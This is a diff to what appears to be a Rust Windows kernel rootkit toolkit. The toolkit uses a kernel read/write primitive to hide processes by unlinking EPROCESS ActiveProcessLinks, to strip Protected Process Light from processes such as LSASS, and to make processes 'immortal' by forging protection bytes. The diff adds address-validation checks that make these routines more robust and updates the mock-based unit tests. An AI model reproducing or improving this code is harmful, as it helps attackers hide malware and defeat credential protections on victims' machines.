@@ -83,6 +83,13 @@ impl ProcessHider {
         offsets: &EprocessOffsets,
     ) -> Result<(), KitError> {
         let link_kva = eprocess_kva + offsets.active_process_links;
+        // Validate link_kva is a canonical kernel address — a corrupted
+        // eprocess_kva + offset can produce a user-mode KVA.
+        if link_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "ActiveProcessLinks: non-canonical link KVA — corrupted EPROCESS base",
+            ));
+        }
         let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
         let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
         if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
@@ -136,6 +143,12 @@ impl PplStripper {
         eprocess_kva: usize,
         offsets: &EprocessOffsets,
     ) -> Result<(), KitError> {
+        // Validate eprocess_kva is a canonical kernel address.
+        if eprocess_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "non-canonical EPROCESS KVA — corrupted base address",
+            ));
+        }
         // Zero the single PS_PROTECTION byte.
         krw.kwrite(
             eprocess_kva + offsets.protection,
@@ -188,6 +201,11 @@ impl PplKit for PplStripper {
         }
         let eprocess_kva =
             ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
+        if eprocess_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "non-canonical EPROCESS KVA — find_eprocess returned a corrupt address",
+            ));
+        }
         // Protection = 0x4B: TYPE_PROTECTED (0x04) | SIGNER_WIN_SYSTEM (0x08 << 3)
         krw.kwrite(
             eprocess_kva + self.offsets.protection,
@@ -577,7 +595,7 @@ mod tests {
     fn strip_protection_zeros_level_and_neighbours() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let eproc = 0x7000usize;
+        let eproc = 0xFFFF_8000_0000_7000usize;
         // Pre-set a protected-LSASS-style Protection + sig levels.
         krw.set_byte(
             eproc + offsets.protection,
@@ -741,9 +759,9 @@ mod tests {
         let krw = MockKrw::new();
         let offsets = test_offsets();
         // Set up PID 500 at e1 with a DTB.
-        let head = 0x1000usize;
-        let e1 = 0x5000usize;
-        let e2 = 0x6000usize;
+        let head = 0xFFFF_8000_0000_1000usize;
+        let e1 = 0xFFFF_8000_0000_5000usize;
+        let e2 = 0xFFFF_8000_0000_6000usize;
         let l1 = e1 + offsets.active_process_links;
         let l2 = e2 + offsets.active_process_links;
         krw.set_u64(head, l1 as u64);
@@ -792,9 +810,9 @@ mod tests {
     fn make_immortal_finds_pid_and_not_wrong_pid() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let head = 0x1000usize;
-        let e1 = 0x5000usize;
-        let e2 = 0x6000usize;
+        let head = 0xFFFF_8000_0000_1000usize;
+        let e1 = 0xFFFF_8000_0000_5000usize;
+        let e2 = 0xFFFF_8000_0000_6000usize;
         let l1 = e1 + offsets.active_process_links;
         let l2 = e2 + offsets.active_process_links;
         krw.set_u64(head, l1 as u64);
